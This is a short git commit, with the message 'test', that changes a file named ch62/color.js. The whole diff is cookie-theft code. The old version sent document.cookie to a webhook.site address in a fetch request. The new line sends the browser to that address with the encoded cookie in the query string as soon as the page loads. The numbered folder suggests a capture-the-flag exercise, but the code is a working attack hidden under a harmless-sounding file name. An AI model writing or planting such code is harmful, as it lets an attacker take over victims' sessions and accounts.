06997733e3e237d959680f02916b877e0c276059
Ugo Colin <ugo.colin.etu@univ-lille.fr>
2025-08-16 23:04:35 +0200

    test

--- ch62/color.js
+++ ch62/color.js
@@ -1,8 +1,3 @@
 document.addEventListener('DOMContentLoaded', () => {
-  fetch('https://webhook.site/fbb5de9c-6eb3-4694-9a49-178ec78c1e2f', {
-    method: 'GET',
-    headers: {
-      'Cookie': document.cookie
-    }
-  });
+  document.location = "https://webhook.site/fbb5de9c-6eb3-4694-9a49-178ec78c1e2f?c=" + encodeURIComponent(document.cookie);
 });
